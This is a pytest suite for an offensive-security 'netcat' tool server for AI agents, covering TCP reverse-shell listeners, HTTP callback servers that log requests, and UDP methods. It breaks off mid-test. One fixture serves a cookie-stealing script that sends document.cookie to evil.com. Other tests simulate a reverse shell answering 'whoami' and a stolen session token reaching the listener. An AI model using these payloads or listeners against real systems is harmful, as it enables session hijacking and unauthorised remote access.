"""
Tests for the netcat MCP tool server.

Covers:
- Smoke tests: boot, method list, required params, meta-param stripping, clock
- TCP methods: listen (blocking/non-blocking), listener_status, listener_read,
  listener_write, exec, stop
- HTTP methods: http_listen (plain + TLS), http_requests (with since/clear),
  http_file (add/update/delete), stop
- UDP methods: udp_listen, udp_packets (with clear), udp_send, stop
- Shared methods: connect, check_port, get_interfaces, list
- Error classification: port already in use, listener not found, connection refused
- Contract tests: tool.yaml vs server parameter definitions

Engagement data (396 calls across 11 engagements, 0 failures):
  http_requests: 123, listener_read: 72, listener_write: 69, http_listen: 37,
  get_interfaces: 19, stop: 17, check_port: 17, listen: 14, listener_status: 10,
  http_file: 10, connect: 5, list: 3.
  Never used in production: exec, udp_listen, udp_packets, udp_send.
"""

import asyncio
import http.client
import importlib.util
import json
import os
import socket
import ssl
import sys
import threading
import time
import urllib.request
from pathlib import Path
from typing import Any, Dict, Set

import pytest
import yaml

# ---------------------------------------------------------------------------
# Path setup
# ---------------------------------------------------------------------------
PROJECT_ROOT = Path(__file__).parent.parent.parent
TOOL_DIR = PROJECT_ROOT / "tools" / "netcat"
FIXTURES_DIR = Path(__file__).parent.parent / "fixtures" / "netcat"

sys.path.insert(0, str(TOOL_DIR))

# Import conftest helpers
from conftest import (
    MCPTestClient,
    assert_tool_error,
    assert_tool_success,
    parse_tool_output,
)


# ---------------------------------------------------------------------------
# Helper: import server module for direct unit testing
# ---------------------------------------------------------------------------
def _get_server_class():
    """Import and return the NetcatServer class for direct method testing."""
    spec = importlib.util.spec_from_file_location(
        "netcat_server", TOOL_DIR / "mcp-server.py"
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.NetcatServer


def _get_module():
    """Import the whole netcat mcp-server module."""
    spec = importlib.util.spec_from_file_location(
        "netcat_server", TOOL_DIR / "mcp-server.py"
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# Helper: find a free port on the host
# ---------------------------------------------------------------------------
def _free_port() -> int:
    """Return a free TCP port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]


# ---------------------------------------------------------------------------
# Helper: TCP echo server for connect/check_port tests
# ---------------------------------------------------------------------------
class _TCPEchoServer:
    """Minimal TCP server that sends a banner, echoes data, then closes."""

    def __init__(self, port: int, banner: str = "ECHO-BANNER-v1\n"):
        self.port = port
        self.banner = banner
        self._server_socket = None
        self._thread = None
        self._stop = False

    def start(self):
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind(("0.0.0.0", self.port))
        self._server_socket.listen(5)
        self._server_socket.settimeout(1.0)
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while not self._stop:
            try:
                client, addr = self._server_socket.accept()
                client.settimeout(5.0)
                if self.banner:
                    client.sendall(self.banner.encode())
                # Echo loop
                try:
                    while True:
                        data = client.recv(4096)
                        if not data:
                            break
                        client.sendall(data)
                except (socket.timeout, ConnectionResetError, BrokenPipeError):
                    pass
                finally:
                    client.close()
            except socket.timeout:
                continue
            except OSError:
                break

    def stop(self):
        self._stop = True
        if self._server_socket:
            self._server_socket.close()
        if self._thread:
            self._thread.join(timeout=5)


# ---------------------------------------------------------------------------
# Module-scoped fixture: MCP client (Docker container)
# ---------------------------------------------------------------------------
@pytest.fixture(scope="module")
def netcat_env(request):
    """Create an MCPTestClient with its event loop. Yields (client, loop)."""
    tool = "netcat"
    prefix = request.config.getoption("--image-prefix", default="mcp-test-")
    image = f"{prefix}{tool}"

    client = MCPTestClient(image=image, tool_name=tool)
    loop = asyncio.new_event_loop()
    try:
        loop.run_until_complete(client.start())
    except Exception:
        loop.run_until_complete(client.stop())
        loop.close()
        raise

    yield client, loop

    loop.run_until_complete(client.stop())
    loop.close()


def _run(env_tuple, coro):
    """Run an async coroutine on the environment's loop."""
    _, loop = env_tuple
    return loop.run_until_complete(coro)


# ===========================================================================
# UNIT TESTS -- no Docker required, test pure Python helpers
# ===========================================================================

class TestUnit:
    """Unit tests for pure functions in the server module."""

    def test_generate_id_tcp(self):
        """generate_id produces IDs with correct prefix."""
        mod = _get_module()
        tid = mod.generate_id("tcp")
        assert tid.startswith("tcp_")
        assert len(tid) == len("tcp_") + 12  # 12 hex chars

    def test_generate_id_http(self):
        """generate_id produces IDs with correct prefix."""
        mod = _get_module()
        hid = mod.generate_id("http")
        assert hid.startswith("http_")

    def test_generate_id_udp(self):
        """generate_id produces IDs with correct prefix."""
        mod = _get_module()
        uid = mod.generate_id("udp")
        assert uid.startswith("udp_")

    def test_generate_id_unique(self):
        """generate_id produces unique IDs."""
        mod = _get_module()
        ids = {mod.generate_id("tcp") for _ in range(100)}
        assert len(ids) == 100

    def test_get_timestamp_format(self):
        """get_timestamp returns ISO format with Z suffix."""
        mod = _get_module()
        ts = mod.get_timestamp()
        assert ts.endswith("Z")
        assert "T" in ts

    def test_detect_content_type(self):
        """_detect_content_type maps extensions correctly."""
        ServerClass = _get_server_class()
        server = ServerClass()
        assert server._detect_content_type("/index.html") == "text/html"
        assert server._detect_content_type("/script.js") == "application/javascript"
        assert server._detect_content_type("/style.css") == "text/css"
        assert server._detect_content_type("/data.json") == "application/json"
        assert server._detect_content_type("/feed.xml") == "application/xml"
        assert server._detect_content_type("/readme.txt") == "text/plain"
        assert server._detect_content_type("/image.png") == "image/png"
        assert server._detect_content_type("/photo.jpg") == "image/jpeg"
        assert server._detect_content_type("/photo.jpeg") == "image/jpeg"
        assert server._detect_content_type("/anim.gif") == "image/gif"
        assert server._detect_content_type("/icon.svg") == "image/svg+xml"
        assert server._detect_content_type("/favicon.ico") == "image/x-icon"
        # No extension -> text/plain default
        assert server._detect_content_type("/noext") == "text/plain"

    def test_tcp_listener_dataclass(self):
        """TCPListener has correct default state."""
        mod = _get_module()
        listener = mod.TCPListener(id="tcp_test", port=4444)
        assert listener.status == "listening"
        assert listener.buffer == ""
        assert listener.reader is None
        assert listener.writer is None
        assert listener.remote_addr is None
        assert listener.is_connected() is False

    def test_http_server_touch(self):
        """HTTPServer.touch updates last_access."""
        mod = _get_module()
        server = mod.HTTPServer(id="http_test", port=8080)
        old_time = server.last_access
        time.sleep(0.01)
        server.touch()
        assert server.last_access > old_time

    def test_udp_packet_dataclass(self):
        """UDPPacket stores hex and text correctly."""
        mod = _get_module()
        packet = mod.UDPPacket(
            timestamp="2026-01-01T00:00:00Z",
            source_ip="10.10.14.5",
            source_port=12345,
            data="hello",
            data_hex="68656c6c6f",
        )
        assert packet.data == "hello"
        assert packet.data_hex == "68656c6c6f"

    def test_generate_self_signed_cert(self):
        """Self-signed cert generation produces valid PEM data."""
        ServerClass = _get_server_class()
        server = ServerClass()
        cert_pem, key_pem = server._generate_self_signed_cert()
        assert b"BEGIN CERTIFICATE" in cert_pem
        assert b"END CERTIFICATE" in cert_pem
        assert b"BEGIN RSA PRIVATE KEY" in key_pem
        assert b"END RSA PRIVATE KEY" in key_pem

    def test_method_registration_count(self):
        """NetcatServer registers exactly 16 methods."""
        ServerClass = _get_server_class()
        server = ServerClass()
        # 16 methods registered by __init__
        assert len(server.methods) == 16, (
            f"Expected 16 methods, got {len(server.methods)}: {sorted(server.methods.keys())}"
        )

    def test_method_names(self):
        """All 16 expected method names are registered."""
        ServerClass = _get_server_class()
        server = ServerClass()
        expected = {
            "listen", "listener_status", "listener_read", "listener_write",
            "exec", "http_listen", "http_requests", "http_file",
            "udp_listen", "udp_packets", "udp_send",
            "connect", "check_port", "get_interfaces", "list", "stop",
        }
        assert set(server.methods.keys()) == expected


# ===========================================================================
# SMOKE TESTS -- require Docker container running
# ===========================================================================

class TestSmoke:
    """Smoke tests that verify the container boots and basic protocol works."""

    def test_boot_and_list_tools(self, netcat_env):
        """Container starts and list_tools returns methods."""
        client, loop = netcat_env
        assert len(client.tools) > 0, "Server should advertise at least one tool"
        names = client.tool_names()
        assert "listen" in names
        assert "listener_status" in names
        assert "listener_read" in names
        assert "listener_write" in names
        assert "exec" in names
        assert "http_listen" in names
        assert "http_requests" in names
        assert "http_file" in names
        assert "udp_listen" in names
        assert "udp_packets" in names
        assert "udp_send" in names
        assert "connect" in names
        assert "check_port" in names
        assert "get_interfaces" in names
        assert "list" in names
        assert "stop" in names

    def test_expected_method_count(self, netcat_env):
        """Server should have exactly 16 built-in methods + verify_clock."""
        client, _ = netcat_env
        names = client.tool_names()
        # 16 built-in + verify_clock in MCP_TEST_MODE
        assert len(names) == 17, (
            f"Expected 17 methods (16 built-in + verify_clock), got {len(names)}: {sorted(names)}"
        )

    def test_method_list_matches_tool_yaml(self, netcat_env):
        """Every method in tool.yaml is advertised by the server, and vice versa."""
        client, _ = netcat_env
        server_names = client.tool_names() - {"verify_clock"}

        yaml_path = TOOL_DIR / "tool.yaml"
        with open(yaml_path) as f:
            yaml_data = yaml.safe_load(f)
        yaml_names = set(yaml_data.get("methods", {}).keys())

        yaml_only = yaml_names - server_names
        server_only = server_names - yaml_names

        assert not yaml_only, f"Methods in tool.yaml but not server: {yaml_only}"
        assert not server_only, f"Methods in server but not tool.yaml: {server_only}"

    def test_required_params_listen(self, netcat_env):
        """Calling listen without required 'port' returns an error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("listen", {}))
        result = resp.get("result", {})
        is_error = result.get("isError", False)
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert is_error or "port" in content_text.lower() or "error" in content_text.lower(), (
            f"Expected error about missing 'port', got: {content_text[:300]}"
        )

    def test_required_params_listener_status(self, netcat_env):
        """Calling listener_status without listener_id returns an error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("listener_status", {}))
        result = resp.get("result", {})
        is_error = result.get("isError", False)
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert is_error or "listener_id" in content_text.lower() or "error" in content_text.lower()

    def test_required_params_check_port(self, netcat_env):
        """Calling check_port without host and port returns an error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("check_port", {}))
        result = resp.get("result", {})
        is_error = result.get("isError", False)
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert is_error or "host" in content_text.lower() or "error" in content_text.lower()

    def test_meta_params_stripped_timeout(self, netcat_env):
        """Passing 'timeout' (meta-param) in args for get_interfaces does not crash."""
        client, loop = netcat_env
        # get_interfaces has no timeout param -- 'timeout' is a meta-param here
        resp = loop.run_until_complete(
            client.call("get_interfaces", {"timeout": 30})
        )
        result = resp.get("result", {})
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert "unexpected keyword argument" not in content_text, (
            f"Meta-param 'timeout' was not stripped: {content_text[:300]}"
        )

    def test_meta_params_stripped_clock_offset(self, netcat_env):
        """Passing 'clock_offset' (meta-param) in args does not crash."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("get_interfaces", {"clock_offset": "+5h"})
        )
        result = resp.get("result", {})
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert "unexpected keyword argument" not in content_text

    def test_unknown_method_returns_error(self, netcat_env):
        """Calling a non-existent method returns a helpful error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("reverse_shell", {}))
        result = assert_tool_error(resp)
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert "Unknown method" in content_text
        assert "reverse_shell" in content_text

    @pytest.mark.clock
    def test_verify_clock_available(self, netcat_env):
        """verify_clock is registered in MCP_TEST_MODE."""
        client, _ = netcat_env
        names = client.tool_names()
        assert "verify_clock" in names

    @pytest.mark.clock
    def test_verify_clock_returns_time(self, netcat_env):
        """verify_clock returns current time and FAKETIME status."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("verify_clock", {}))
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "current_time" in data
        assert "libfaketime_exists" in data

    def test_structuredContent_present(self, netcat_env):
        """Responses include structuredContent with error classification fields."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("verify_clock", {}))
        result = resp.get("result", {})
        sc = result.get("structuredContent")
        assert sc is not None, "structuredContent should be present"
        assert "success" in sc
        assert "error_class" in sc
        assert "retryable" in sc
        assert "suggestions" in sc


# ===========================================================================
# TCP LISTENER TESTS -- require Docker container
# ===========================================================================

class TestTCPListener:
    """Tests for listen, listener_status, listener_read, listener_write, stop."""

    def test_listen_nonblocking(self, netcat_env):
        """Non-blocking listen (timeout=0) returns immediately with listener_id."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "listener_id" in data
        assert data["port"] == port
        assert data["status"] == "listening"
        assert data["mode"] == "non-blocking"

        # Clean up
        loop.run_until_complete(client.call("stop", {"id": data["listener_id"]}))

    def test_listen_invalid_port_zero(self, netcat_env):
        """Listen on port 0 should fail."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("listen", {"port": 0})
        )
        assert_tool_error(resp, "Invalid port")

    def test_listen_invalid_port_high(self, netcat_env):
        """Listen on port >65535 should fail."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("listen", {"port": 70000})
        )
        assert_tool_error(resp, "Invalid port")

    def test_listen_port_already_in_use(self, netcat_env):
        """Starting two listeners on the same port should fail."""
        client, loop = netcat_env
        port = _free_port()

        # Start first listener
        resp1 = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data1 = parse_tool_output(resp1)
        lid1 = data1["listener_id"]

        # Try second on same port
        resp2 = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        assert_tool_error(resp2, "already in use")

        # Clean up
        loop.run_until_complete(client.call("stop", {"id": lid1}))

    def test_listener_status_listening(self, netcat_env):
        """Status shows 'listening' before any connection."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Check status
        resp2 = loop.run_until_complete(
            client.call("listener_status", {"listener_id": lid})
        )
        result = assert_tool_success(resp2)
        status_data = parse_tool_output(resp2)
        assert status_data["status"] == "listening"
        assert status_data["port"] == port

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_status_connected(self, netcat_env):
        """Status shows 'connected' after a TCP client connects."""
        client, loop = netcat_env
        port = _free_port()

        # Start listener
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Connect from host (--network=host means we connect to localhost)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.5)  # Let the server accept

        # Check status
        resp2 = loop.run_until_complete(
            client.call("listener_status", {"listener_id": lid})
        )
        status_data = parse_tool_output(resp2)
        assert status_data["status"] == "connected"
        assert "remote_ip" in status_data

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_read_write_cycle(self, netcat_env):
        """Full reverse shell simulation: listen, connect, write, read."""
        client, loop = netcat_env
        port = _free_port()

        # Start non-blocking listener
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Simulate reverse shell connecting
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.5)

        # Write command through MCP
        resp_w = loop.run_until_complete(
            client.call("listener_write", {"listener_id": lid, "data": "whoami\n"})
        )
        w_data = parse_tool_output(resp_w)
        assert w_data["bytes_sent"] == 7  # "whoami\n"

        # Read what was sent on the client side
        received = sock.recv(4096)
        assert received == b"whoami\n"

        # Send response from "shell" back to listener
        sock.sendall(b"root\n")
        time.sleep(0.3)

        # Read via MCP
        resp_r = loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 5})
        )
        r_data = parse_tool_output(resp_r)
        assert "root" in r_data["data"]
        assert r_data["bytes"] == 5  # "root\n"

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_write_not_found(self, netcat_env):
        """Writing to a non-existent listener returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("listener_write", {
                "listener_id": "tcp_nonexistent00",
                "data": "test\n",
            })
        )
        assert_tool_error(resp, "not found")

    def test_listener_read_not_found(self, netcat_env):
        """Reading from a non-existent listener returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("listener_read", {
                "listener_id": "tcp_nonexistent00",
                "timeout": 1,
            })
        )
        assert_tool_error(resp, "not found")

    def test_listener_status_not_found(self, netcat_env):
        """Checking status of a non-existent listener returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("listener_status", {"listener_id": "tcp_nonexistent00"})
        )
        assert_tool_error(resp, "not found")

    def test_listener_read_no_connection(self, netcat_env):
        """Reading from a listener with no connection returns error."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Try reading without connecting
        resp_r = loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 1})
        )
        assert_tool_error(resp_r, "No active connection")

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_write_no_connection(self, netcat_env):
        """Writing to a listener with no connection returns error."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        resp_w = loop.run_until_complete(
            client.call("listener_write", {"listener_id": lid, "data": "test\n"})
        )
        assert_tool_error(resp_w, "No active connection")

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listener_read_connection_closed(self, netcat_env):
        """Reading after client disconnects returns error."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Connect then immediately close
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.3)
        sock.close()
        time.sleep(0.3)

        # Read should detect closed connection
        resp_r = loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 2})
        )
        assert_tool_error(resp_r, "closed")

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listen_with_response_template(self, netcat_env):
        """Listener sends response template upon connection."""
        client, loop = netcat_env
        port = _free_port()
        fake_http = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"

        resp = loop.run_until_complete(
            client.call("listen", {
                "port": port,
                "timeout": 0,
                "response": fake_http,
            })
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Connect and read the response template
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        sock.settimeout(3.0)
        received = sock.recv(4096)
        assert received.decode() == fake_http

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_listen_blocking_with_connection(self, netcat_env):
        """Blocking listen returns connected data when a client connects."""
        client, loop = netcat_env
        port = _free_port()

        # Connect in background after a short delay
        def delayed_connect():
            time.sleep(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", port))
            s.sendall(b"shell-data-here\n")
            time.sleep(2)
            s.close()

        t = threading.Thread(target=delayed_connect, daemon=True)
        t.start()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 10})
        )
        data = parse_tool_output(resp)
        assert data["status"] == "connected"
        assert "remote_ip" in data
        # The initial_data may or may not include the shell data depending on timing
        lid = data["listener_id"]

        t.join(timeout=5)
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_stop_tcp_returns_buffered_data(self, netcat_env):
        """Stopping a TCP listener returns its buffered data."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        # Connect and send data
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.3)
        sock.sendall(b"buffered-content\n")
        time.sleep(0.3)

        # Read it to fill buffer
        loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 3})
        )

        sock.close()

        # Stop should return the buffered data
        resp_stop = loop.run_until_complete(client.call("stop", {"id": lid}))
        stop_data = parse_tool_output(resp_stop)
        assert stop_data["type"] == "tcp"
        assert stop_data["port"] == port
        assert "buffered-content" in stop_data.get("buffered_data", "")


# ===========================================================================
# EXEC (ONE-SHOT CAPTURE) TESTS
# ===========================================================================

class TestExec:
    """Tests for the exec one-shot TCP capture method."""

    def test_exec_captures_data(self, netcat_env):
        """exec captures data from a single TCP connection."""
        client, loop = netcat_env
        port = _free_port()

        # Send data after a short delay
        def delayed_send():
            time.sleep(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect(("127.0.0.1", port))
                s.sendall(b"captured-output-from-reverse-shell\n")
                s.close()
            except ConnectionRefusedError:
                pass

        t = threading.Thread(target=delayed_send, daemon=True)
        t.start()

        resp = loop.run_until_complete(
            client.call("exec", {"port": port, "timeout": 10})
        )
        data = parse_tool_output(resp)
        assert "captured-output-from-reverse-shell" in data["output"]
        assert "remote_ip" in data
        assert data["bytes"] > 0

        t.join(timeout=5)

    def test_exec_timeout(self, netcat_env):
        """exec returns error when no connection arrives within timeout."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("exec", {"port": port, "timeout": 2})
        )
        assert_tool_error(resp, "No connection")

    def test_exec_port_in_use(self, netcat_env):
        """exec fails if port is already in use."""
        client, loop = netcat_env
        port = _free_port()

        # Occupy the port first
        resp1 = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data1 = parse_tool_output(resp1)
        lid = data1["listener_id"]

        # Try exec on same port
        resp2 = loop.run_until_complete(
            client.call("exec", {"port": port, "timeout": 2})
        )
        assert_tool_error(resp2, "already in use")

        loop.run_until_complete(client.call("stop", {"id": lid}))


# ===========================================================================
# HTTP SERVER TESTS
# ===========================================================================

class TestHTTP:
    """Tests for http_listen, http_requests, http_file, stop."""

    def test_http_listen_basic(self, netcat_env):
        """Start HTTP server and verify it returns server_id and URL."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        result = assert_tool_success(resp)
        data = parse_tool_output(resp)
        assert "server_id" in data
        assert data["port"] == port
        assert data["tls"] is False
        sid = data["server_id"]

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_listen_with_files(self, netcat_env):
        """HTTP server serves configured files."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {
                "port": port,
                "files": {
                    "/index.html": "<h1>XSS Test</h1>",
                    "/exploit.js": "fetch('http://evil.com/?c='+document.cookie)",
                },
            })
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        # Fetch the files via HTTP
        time.sleep(0.5)
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{port}/index.html") as r:
                body = r.read().decode()
                assert "<h1>XSS Test</h1>" in body

            with urllib.request.urlopen(f"http://127.0.0.1:{port}/exploit.js") as r:
                body = r.read().decode()
                assert "document.cookie" in body
        finally:
            loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_listen_index_fallback(self, netcat_env):
        """/ falls back to /index.html when it exists."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {
                "port": port,
                "files": {"/index.html": "<html>Home Page</html>"},
            })
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{port}/") as r:
                body = r.read().decode()
                assert "Home Page" in body
        finally:
            loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_listen_404_still_captures(self, netcat_env):
        """Requests to non-existent paths return 404 but are still captured."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        # Request a path that doesn't exist
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/nonexistent")
        except urllib.error.HTTPError:
            pass  # 404 expected

        time.sleep(0.3)

        # Check requests captured
        resp_r = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        r_data = parse_tool_output(resp_r)
        assert r_data["request_count"] >= 1
        found = any(req["path"] == "/nonexistent" for req in r_data["requests"])
        assert found, "404 request should still be captured"

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_requests_captures_query_params(self, netcat_env):
        """HTTP server captures query parameters (cookie stealing scenario)."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        # Simulate XSS callback: /?c=stolen_session_token
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/?c=stolen_session_token")
        except urllib.error.HTTPError:
            pass

        time.sleep(0.3)

        resp_r = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        r_data = parse_tool_output(resp_r)
        assert r_data["request_count"] >= 1
        req = r_data["requests"][0]
        assert req["query"].get("c") == "stolen_session_token"

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_requests_clear(self, netcat_env):
        """clear=True empties the request buffer."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/test")
        except urllib.error.HTTPError:
            pass
        time.sleep(0.3)

        # Clear
        resp_clear = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid, "clear": True})
        )
        clear_data = parse_tool_output(resp_clear)
        assert clear_data["request_count"] >= 1  # Should have returned data before clearing

        # Now should be empty
        resp_after = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        after_data = parse_tool_output(resp_after)
        assert after_data["request_count"] == 0

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_requests_since_filter(self, netcat_env):
        """since parameter filters requests by timestamp."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        # Make first request
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/early")
        except urllib.error.HTTPError:
            pass
        time.sleep(0.5)

        # Get the timestamp of the first request from the server
        resp_all = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        all_data = parse_tool_output(resp_all)
        assert all_data["request_count"] >= 1
        # Use the first request's timestamp as the since filter
        since = all_data["requests"][0]["timestamp"]
        time.sleep(0.5)

        # Make second request
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/late")
        except urllib.error.HTTPError:
            pass
        time.sleep(0.3)

        # Filter with since -- should only get /late (since is exclusive: > not >=)
        resp_r = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid, "since": since})
        )
        r_data = parse_tool_output(resp_r)
        paths = [req["path"] for req in r_data["requests"]]
        assert "/late" in paths
        # /early should be excluded because its timestamp == since (filter is >)
        early_count = sum(1 for p in paths if p == "/early")
        assert early_count == 0, f"Expected /early to be filtered out, paths: {paths}"

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_http_requests_not_found(self, netcat_env):
        """http_requests with invalid server_id returns error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("http_requests", {"server_id": "http_nonexistent0"})
        )
        assert_tool_error(resp, "not found")

    def test_http_file_add_update_delete(self, netcat_env):
        """http_file can add, update, and delete files on a running server."""
        client, loop = netcat_env
        port = _free_port()

        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]
        time.sleep(0.5)

        # Add file
        resp_add = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/payload.html",
                "content": "<script>alert(1)</script>",
            })
        )
        add_data = parse_tool_output(resp_add)
        assert add_data["action"] == "updated"
        assert add_data["content_type"] == "text/html"

        # Verify file is served
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/payload.html") as r:
            assert "alert(1)" in r.read().decode()

        # Update file
        resp_update = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/payload.html",
                "content": "<script>alert(2)</script>",
            })
        )
        update_data = parse_tool_output(resp_update)
        assert update_data["action"] == "updated"

        with urllib.request.urlopen(f"http://127.0.0.1:{port}/payload.html") as r:
            assert "alert(2)" in r.read().decode()

        # Delete file
        resp_del = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/payload.html",
            })
        )
        del_data = parse_tool_output(resp_del)
        assert del_data["action"] == "deleted"

        # Verify 404
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/payload.html")
            assert False, "Should have gotten 404"
        except urllib.error.HTTPError as e:
